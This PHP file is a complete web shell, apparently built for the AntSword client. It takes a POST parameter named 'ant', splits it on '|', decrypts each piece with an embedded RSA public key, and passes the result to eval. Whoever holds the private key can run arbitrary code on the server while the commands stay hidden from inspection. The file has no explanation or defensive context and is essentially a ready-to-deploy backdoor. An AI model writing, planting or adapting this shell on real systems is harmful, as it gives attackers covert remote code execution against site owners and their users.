<?php
$cmd = @$_POST['ant'];
$pk = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDAXx0+XTT324zTNGRUcfIyLPVw
s5SzxgsU5NgwCbhLG2Od9+y6E7ZwazGhwibBwVWZu2Dz2kHJGMnzuJHdNn5qNiSW
80eT4ziaMOZVxzU3K6cSDoAdnTU3ZocEspjjvZYQLi4/W9vAPLqJ7x8TlRdwmpU8
MO/n2mrqg4EhsPca8wIDAQAB
-----END PUBLIC KEY-----
EOF;
$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
    $cmd .= $de;
  }
}
eval($cmd);